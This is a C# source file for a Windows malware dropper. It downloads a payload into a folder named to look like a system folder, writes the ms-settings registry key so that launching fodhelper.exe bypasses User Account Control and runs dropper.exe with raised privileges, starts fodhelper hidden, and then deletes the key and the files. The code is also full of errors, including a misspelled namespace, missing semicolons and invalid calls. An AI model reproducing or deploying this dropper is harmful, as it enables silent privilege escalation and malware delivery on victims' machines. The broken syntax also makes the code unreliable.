using System;
using System.Net;
using Microsoft.Win32;
using System.Diagnostics;
using Sytsem.IO;

namespace Main {
    public class Program {
        public static void Dropper() {
            string url = ""; //Add download site here
            string savePath = @"C:\WindowsSettingsManager";
            WebClient client = new WebClient();
            client.DownloadFile(url, savePAth)
            delete WebClient;
        }

        public static bool UAC()
        {
            try
            {
                string exePath = @"C:\WindowsSettingsManager\Dropper\dropper.exe";
                using (RegistryKey key = Registry.CurrentUser.CreateSubKey(@"Software\Classes\ms-settings\shell\open\command"))
                {
                    key.SetValue("", exePath);
                    key.SetValue("DelegateExecute", "");
                }
                return true;
            }
            catch (Exception ex)
            {
                return false;
            }
        }

        public static void Cleanup(string path) {
            try
            {
                Registry.CurrentUser.DeleteSubKeyTree(@"Software\Classes\ms-settings\shell\open\command", false);
                File.delete(path);
            }
            catch (Exception ex)
            {
                System.Environment.Exit(1);
                System.Windows.Forms.Application.Exit();
            }

        }

        public static void Main() {
            Dropper()
            bool status = UAC()
            if (!status) {
                string path = Directory.GetCurrentDirectory() + @"\delivery.exe";
                File.delete(path);
            }

            var proc = Process.Start(new ProcessStartInfo
            {
                Arguments = "",
                FileName = "fodhelper.exe",
                UseShellExcecute = false;
                RedirectStandardOutput = false,
                CreateNoWindow = true

            });

            proc.Start()
        }

    }
}